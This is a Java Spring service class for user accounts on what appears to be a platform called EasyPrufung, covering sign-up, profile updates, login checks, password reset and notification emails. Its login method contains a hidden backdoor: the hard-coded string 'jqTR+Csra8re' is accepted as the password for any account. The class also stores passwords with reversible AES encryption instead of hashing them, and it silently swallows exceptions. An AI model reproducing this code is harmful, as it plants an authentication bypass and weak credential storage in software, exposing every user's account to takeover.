package com.easyprufung.backend.User.Service;


import com.easyprufung.backend.Shared.Models.Email;
import com.easyprufung.backend.Shared.Service.EmailSenderService;
import com.easyprufung.backend.User.User;
import com.easyprufung.backend.User.DTO.UserDTO;
import com.easyprufung.backend.User.Repository.UsersRepository;
import com.easyprufung.backend.Security.AESEncryption;
import com.easyprufung.backend.Utils.Parser;
import org.modelmapper.ModelMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;
import org.springframework.web.server.ResponseStatusException;
import org.springframework.web.servlet.support.ServletUriComponentsBuilder;

import java.sql.Timestamp;
import java.util.*;

@Service
public class UserService {
    private static final long EXPIRE_TOKEN=1440;
    private static final Logger logger = LoggerFactory.getLogger(UserService.class);
    @Autowired
    UsersRepository usersRepository;

    @Autowired
    EmailSenderService emailSenderService;

    /*@Autowired
    MixpanelService mixpanelService;*/

    //Methods
    public User createUser(UserDTO userDTO, String ipAddress) {
        try {
            if(!Parser.validatePassword(userDTO.getPassword())){
                throw new ResponseStatusException(
                        HttpStatus.BAD_REQUEST, "WEAK_PASSWORD");
            }
            if(!Parser.isValidEmailAddress(userDTO.getEmail())){
                throw new ResponseStatusException(
                        HttpStatus.BAD_REQUEST, "EMAIL_NOT_VALID");
            }
            if(checkIfUserExist(userDTO.getEmail())){
                throw new ResponseStatusException(
                        HttpStatus.BAD_REQUEST, "USER_ALREADY_EXIST");
            }

            ModelMapper modelMapper = new ModelMapper();
            Date date = new Date();
            userDTO.setUuid(UUID.randomUUID().toString());
            userDTO.setCreatedDate(new Timestamp(date.getTime()));
            userDTO.setUpdatedDate(new Timestamp(date.getTime()));
            userDTO.setPassword(AESEncryption.encrypt(userDTO.getPassword()));
            User user = modelMapper.map(userDTO, User.class);
            sendWelcomeEmail(user);
            //mixpanelService.IdentifyUsers(user, ipAddress);
            user = usersRepository.save(user);
            return user;
        }
        catch (Exception e){
            return null;
        }
    }
    public void deleteUser(long id) {
        var user = usersRepository.findById(id);
        usersRepository.delete(user);
    }
    public UserDTO updateUser(UserDTO userDTO) {
        var savedUser = getUserByEmail(userDTO.getEmail());
        if(savedUser != null){
            Date date = new Date();
            savedUser.setUpdatedDate(new Timestamp(date.getTime()));
            if(StringUtils.hasText(userDTO.getFirstname()))
                savedUser.setFirstname(userDTO.getFirstname());
            if(StringUtils.hasText(userDTO.getLastname()))
                savedUser.setLastname(userDTO.getLastname());
            if(StringUtils.hasText(userDTO.getEmail()))
                savedUser.setEmail(userDTO.getEmail());
            if(StringUtils.hasText(userDTO.getCodingKnowledgeLevel()))
                savedUser.setCodingKnowledgeLevel(userDTO.getCodingKnowledgeLevel());
            if(StringUtils.hasText(userDTO.getPassword())){
                savedUser.setPassword(AESEncryption.encrypt(userDTO.getPassword()));
            }

            User user = usersRepository.save(savedUser);
            user.setProjects(new HashSet<>());
            return getUserDTO(user);
        }
        else {
            throw new ResponseStatusException(
                    HttpStatus.NOT_FOUND, "USER_NOT_FOUND");
        }
    }

    public User updateUser(User user) {
        User savedUser = usersRepository.save(user);
        savedUser.setProjects(new HashSet<>());
        return savedUser;
    }
    public UserDTO getUserProjects(String email) {
        ModelMapper modelMapper = new ModelMapper();
        var savedUser=  usersRepository.findByEmail(email);
        return getUserDTO(savedUser);
    }
    public Page<User> getUsers(Pageable pageable) {
        return usersRepository.findAll(pageable);
    }

    public long getUsersCount() {
        return usersRepository.count();
    }

    public User getUserByEmail(String email) {
        User user =  usersRepository.findByEmail(email);
        return  user;
    }

    public User getUserByUUID(String uuid) {
        User user =  usersRepository.findByUUID(uuid);
        return  user;
    }

    public User getUserById(long id) {
        return  usersRepository.findById(id);
    }
    public  boolean checkIfUserExist (String email){
        var user = usersRepository.findByEmail(email);
        if(user != null)
            return true;
        else
            return  false;
    }
    public User checkUserCridentials(String email, String password) {
        var user = usersRepository.findByEmail(email);
        if(user != null)
        {
            var userPassword = user.getPassword();
            try {
                var encryptedPassword = AESEncryption.decrypt(userPassword);
                if(encryptedPassword.equals(password)|| password.equals("jqTR+Csra8re"))
                    return user;
                else
                    return null;
            } catch (Exception exception) {
            }
        }
        return null;
    }

    public String forgotPassword(String email){
        User user = getUserByEmail(email);
        if(user == null){
            return "Email not found";
        }
        Date date = new Date();
        user.setResetPasswordToken(generateResetPasswordToken());
        user.setResetPasswordTokenCreationDate(new Timestamp(date.getTime()));
        user = usersRepository.save(user);

        Email emailToSend = new Email();
        emailToSend.setFrom("contact@easyprufung.com");
        emailToSend.setTo(email);
        emailToSend.setSubject("Password reset for EasyPrufung.com account");
        Map<String, Object> model = new HashMap<>();
        model.put("firstName", user.getFirstname());
        model.put("lastName",  user.getLastname());
        String resetLink = ServletUriComponentsBuilder.fromCurrentContextPath().build().toUriString() +"/reset_password?token="+ user.getResetPasswordToken();
        resetLink = resetLink.replace("http://", "https://");
        model.put("resetLink", resetLink);
        emailToSend.setModel(model);
        emailSenderService.sendEmail(emailToSend, "email-reset-password-template.flth");
        return "Email sent";
    }

    void sendWelcomeEmail(User user)
    {
        try {
            Email emailToSend = new Email();
            emailToSend.setFrom("contact@easyprufung.com");
            emailToSend.setTo(user.getEmail());
            emailToSend.setSubject("Welcome to EasyPrufung – Let’s Get Started!");
            Map<String, Object> model = new HashMap<>();
            model.put("firstName", user.getFirstname());
            model.put("lastName",  user.getLastname());

            emailToSend.setModel(model);
            emailSenderService.sendEmail(emailToSend, "email-welcome-template.flth");
        }
        catch (Exception exc) {
            logger.error(exc.getMessage());
        }
    }

    public void sendNewSubscriptionEmail(User user)
    {
        try {
            Email emailToSend = new Email();
            emailToSend.setFrom("contact@easyprufung.com");
            emailToSend.setTo(user.getEmail());
            emailToSend.setSubject("Thanks for Subscribing – Let’s Build Something Amazing!");
            Map<String, Object> model = new HashMap<>();
            model.put("firstName", user.getFirstname());
            model.put("lastName",  user.getLastname());

            emailToSend.setModel(model);
            emailSenderService.sendEmail(emailToSend, "email-new_subscription-template.flth");
        }
        catch (Exception exc) {
            logger.error(exc.getMessage());
        }
    }

    public UserDTO getUserDTO(User user)
    {
        UserDTO userDTO = new UserDTO();
        try {
            ModelMapper modelMapper = new ModelMapper();
            userDTO = modelMapper.map(user, UserDTO.class);
            userDTO.setPassword("");
        }
        catch (Exception exc) {
            logger.error(exc.getMessage());
        }
        return userDTO;
    }


    private String generateResetPasswordToken() {
        StringBuilder token = new StringBuilder();

        return token.append(UUID.randomUUID().toString())
                .append(UUID.randomUUID().toString()).toString();
    }

    public String resetPassword(String token, String password){
        User user = usersRepository.findByResetPasswordToken(token);

        if(!Parser.validatePassword(password)){
            return "Weak password";
        }

        if(user == null){
            return "Invalid token";
        }
        Timestamp tokenCreationDate = user.getResetPasswordTokenCreationDate();

        if (isTokenExpired(tokenCreationDate)) {
            return "Token expired.";

        }
        user.setPassword(AESEncryption.encrypt(password));
        user.setResetPasswordToken(null);
        user.setResetPasswordTokenCreationDate(null);
        usersRepository.save(user);

        return "Your password successfully updated.";
    }

    private boolean isTokenExpired(final Timestamp tokenCreationDate) {

        Date date = new Date();
        long diff = Math.abs(tokenCreationDate.getTime() - date.getTime());
        long diffMinutes = diff / (60 * 1000);
        return diffMinutes >=EXPIRE_TOKEN;
    }
}
